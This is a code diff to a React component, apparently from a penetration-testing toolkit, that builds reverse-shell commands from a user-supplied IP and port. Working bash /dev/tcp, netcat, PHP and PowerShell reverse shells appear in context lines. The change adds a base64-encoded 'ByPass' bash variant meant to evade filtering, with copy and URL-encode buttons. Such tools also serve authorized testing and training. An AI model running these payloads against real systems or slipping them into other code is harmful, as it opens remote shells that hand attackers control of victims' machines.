@@ -27,6 +27,7 @@ export default function ReverseShell () {
         message.success( 'Reverse shell URI encoded has been copied successfully !' );
     };
     const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${ values.ip }/${ values.port } <&1'`;
+    const bash_rshellByPass = `bash<<<$(base64 -d<<<`+Buffer.from(bash_rshell, 'binary').toString('base64')+`)`;
     const netcat_rshell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ values.ip } ${ values.port } >/tmp/f`;
     const php_rshell = `php -r '$sock=fsockopen(getenv("${ values.ip }"),getenv("${ values.port }"));exec("/bin/sh -i <&3 >&3 2>&3");'`;
     const PS_rshell = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ values.ip }',${ values.port });$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
@@ -49,7 +50,7 @@ export default function ReverseShell () {
                 <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
                     <Col span={12}>
                         <Input
-                            maxLength={15}
+                            maxLength={100}
                             prefix={<WifiOutlined />}
                             name='Ip adress'
                             placeholder='IP Address or domain (ex: 212.212.111.222)'
@@ -59,7 +60,7 @@ export default function ReverseShell () {
                     </Col>
                     <Col span={12}>
                         <Input
-                            maxLength={5}
+                            maxLength={15}
                             prefix={<IconFont type='icon-Network-Plug' />}
                             name='Port'
                             placeholder='Port (ex: 1337)'
@@ -86,6 +87,32 @@ export default function ReverseShell () {
                     </Button>
                 </Clipboard>
                 <Clipboard component='a' data-clipboard-text={encodeURI( bash_rshell )}>
+                    <Button
+                        type='dashed'
+                        onClick={successInfoEncodeURL}
+                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+                    >
+                        <LinkOutlined /> URL encoded
+                    </Button>
+                </Clipboard>
+            </div>
+            <Divider orientation='center'>Bash ByPass pipe</Divider>
+            <div style={{ padding: 10, marginTop: 15 }} key='a'>
+                <Paragraph>
+                    <pre>
+                        <Text copyable>{bash_rshellByPass}</Text>
+                    </pre>
+                </Paragraph>
+                <Clipboard component='a' data-clipboard-text={bash_rshellByPass}>
+                    <Button
+                        type='primary'
+                        onClick={successInfoReverseShell}
+                        style={{ marginBottom: 10, marginTop: 15 }}
+                    >
+                        <CopyOutlined /> Copy the reverse shell
+                    </Button>
+                </Clipboard>
+                <Clipboard component='a' data-clipboard-text={encodeURI( bash_rshellByPass )}>
                     <Button
                         type='dashed'
                         onClick={successInfoEncodeURL}
